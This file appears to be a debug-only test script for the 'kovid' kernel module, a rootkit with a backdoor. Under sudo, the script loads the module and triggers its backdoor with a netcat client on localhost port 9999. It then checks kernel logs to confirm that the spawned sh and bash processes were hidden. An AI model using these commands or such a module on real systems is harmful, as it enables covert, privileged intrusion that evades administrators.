# REQUIRES: DEBUG_ONLY
# REQUIRES: NATIVE_TESTS

# RUN: bash %s > %t.log
# RUN: FileCheck-18 --input-file=%t.log %s

sudo dmesg -c
sudo insmod ../../../build/kovid.ko
sudo timeout 10 ../../../scripts/bdclient.sh nc localhost 9999 < /dev/null
sudo rmmod kovid
dmesg

# CHECK: kv: using kprobe for kallsyms_lookup_name
# CHECK: Waiting for event
# CHECK: loaded
# CHECK: Got event
# CHECK: hide [{{.*}}] sh : {{.*}}
# CHECK: hide [{{.*}}] bash : {{.*}}
# CHECK: Got event
# CHECK: unloaded
